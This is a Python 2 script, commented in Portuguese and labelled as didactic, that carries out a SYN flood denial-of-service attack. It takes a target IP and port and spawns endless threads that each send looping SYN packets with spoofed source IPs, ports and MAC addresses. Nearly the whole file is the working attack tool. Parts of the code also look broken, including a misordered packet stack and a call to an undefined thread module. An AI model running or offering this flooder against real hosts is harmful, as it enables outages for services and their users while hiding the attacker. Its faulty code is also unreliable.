#!/usr/bin/python
#coding=utf-8
#coded by:S0ph0s
# Programa para fins didáticos a qual demonstra o ataque de SYN FLOOD

from os import system
from random import randint	
import socket
from time import sleep
from thread import start_new_thread
from sys import exit
from scapy.all import *
from scapy.error import Scapy_Exception
number = 0

def synTCP(ip_alvo,porta_alvo):
	ip = IP()
	tcp = TCP()
	ip.dst = ip_alvo 
	ip.src = "%i.%i.%i.%i" % (randint(1,254),randint(1,254),randint(1,254),randint(1,254)) 	# criando spoofing do IP de modo aleatório 
	tcp.sport = randint(1,65535) # porta de origem para fazer spoofing, valor da porta variando entre 1 a 65535
	tcp.dport = porta_alvo 
	tcp.flags = "S" 
	send(ip/tcp/Ether(src=RandMAC(),dst="ff:ff:ff:ff:ff:ff"), loop= 1, verbose=1) 	# empacotando e endereçando + MAC Spoofing
	sleep(5) 
    	thread.exit() 

ip_alvo = raw_input ("Insert IP/DNS: ")
porta_alvo = input ("Insert the port:")

while(1):
	try:
		number = number + 1
		start_new_thread(synTCP,(ip_alvo,porta_alvo )) 
	 	print "Threads ---> %s" %str(number)
	except socket.error:
		print ("Fininishing..")
		exit(1)


